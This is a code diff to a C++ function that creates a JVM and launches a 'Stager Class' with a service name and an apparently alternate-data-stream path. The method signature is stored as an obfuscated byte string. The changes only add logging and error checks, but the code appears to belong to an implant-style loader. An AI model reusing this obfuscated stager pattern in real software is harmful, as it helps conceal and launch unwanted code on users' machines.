@@ -352,6 +352,12 @@ BOOL WINAPI InvokeMain( std::string *serviceName, std::string adsPath ) {
 		Log( "Error creating JVM\n");
 #endif
 		return FALSE;
+	} else {
+	
+		#ifdef _DBG
+			Log( "JVM created.\n");
+		#endif
+	
 	}
 
 	//Find the java class
@@ -360,6 +366,14 @@ BOOL WINAPI InvokeMain( std::string *serviceName, std::string adsPath ) {
     cls = env->FindClass(start_class);
 	free(start_class);
 
+	//Check if it was found
+	if( cls == nullptr ){
+		#ifdef _DBG
+			Log( "Unable to locate Stager Class\n");
+		#endif
+		return FALSE;	
+	}
+	
 	// invoke the main method
 	//([Ljava/lang/String;)V
 	char *java_str = decode_split("\x2\x8\x5\xb\x4\xc\x6\xa\x6\x1\x7\x6\x6\x1\x2\xf\x6\xc\x6\x1\x6\xe\x6\x7\x2\xf\x5\x3\x7\x4\x7\x2\x6\x9\x6\xe\x6\x7\x3\xb\x2\x9\x5\x6",44);
@@ -368,7 +382,7 @@ BOOL WINAPI InvokeMain( std::string *serviceName, std::string adsPath ) {
 	mid = env->GetStaticMethodID(cls, main_str, java_str);
 	free(java_str);
 	free(main_str);
-
+	
     //Set arguments
 	std::string arg1;
 	if(serviceName != nullptr)
@@ -389,7 +403,7 @@ BOOL WINAPI InvokeMain( std::string *serviceName, std::string adsPath ) {
 	env->SetObjectArrayElement(args,0,jstr);
 
     env->CallStaticVoidMethod(cls, mid, args);
-	
+
 	//if there is any exception log
 	if(env->ExceptionCheck()) {
 
